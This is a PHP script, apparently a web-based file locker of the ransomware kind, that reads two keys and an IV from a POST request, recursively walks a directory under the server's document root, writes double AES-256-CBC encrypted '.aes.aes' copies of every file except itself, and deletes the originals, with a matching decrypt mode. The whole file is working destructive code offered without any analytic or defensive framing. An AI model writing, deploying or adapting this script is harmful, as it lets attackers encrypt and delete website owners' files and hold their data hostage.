<?php
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) { //Credits to some website which isn't up right now
$output = false;

$encrypt_method = "AES-256-CBC";

$key = hash('sha256', $secret_key);

$iv = substr(hash('sha256', $secret_iv), 0, 16);

if( $action == 'encrypt' ) {
	return base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
} else if( $action == 'decrypt' ){
	return openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
}
}

function encfile($filename){ 
	if (strpos($filename, '.aes.aes') !== false) {
		return;
	}
	file_put_contents($filename.".aes.aes", (encrypt_decrypt('encrypt', (encrypt_decrypt('encrypt', file_get_contents($filename), $_POST['key1'], $_POST['iv'])), $_POST['key2'], $_POST['iv'])));
	unlink($filename);
}


function decfile($filename){

	$key1 = $_POST['key1'];
	$key2 = $_POST['key2'];
	$iv = $_POST['iv'];
	
	if (strpos($filename, '.aes.aes') === FALSE) {
		return;
	}
	$encrypted2 = file_get_contents($filename);
	$encrypted = encrypt_decrypt('decrypt', $encrypted2, $key2, $iv);
	$decrypted = encrypt_decrypt('decrypt', $encrypted, $key1, $iv);
	file_put_contents(substr($filename, 0, -8), $decrypted);
	unlink($filename);
}


function cdir ($dir, $vtost){
	$iroot = __FILE__;
	$files = array_diff(scandir($dir), array('.', '..'));
	foreach($files as $file) {
		if(is_dir($dir."/".$file)){
			cdir($dir."/".$file, $vtost);
		}else {
			$vroot =  $dir."/".$file;
			if($iroot !== $vroot) {			

				if($vtost === FALSE)
					encfile($vroot);
					//echo '<br/>  <span style="color: red;">Encrypt</span>  <br/>';

				if($vtost === TRUE)
					decfile($vroot);
					//echo '<br/>  <span style="color: green;">Decrypt</span>  <br/>';	

				echo $dir."/".$file . " <br/>";
					//encfile($vroot);
					//decfile($vroot);
			}  
		}
	}
}

if(isset($_POST['key1']) && isset($_POST['key2']) && isset($_POST['iv']) && isset($_POST['crypt']) ){
	$root  = $_SERVER['DOCUMENT_ROOT'] . '/rev'; 

	
	$vtost = FALSE;
	if(!is_null($_POST['crypt'])) 
		if($_POST['crypt'] == 1)  
			$vtost = TRUE;  

		if($vtost === FALSE)
			cdir($root, $vtost); 

		if($vtost === TRUE)
			cdir($root, $vtost); 


	}
	?>
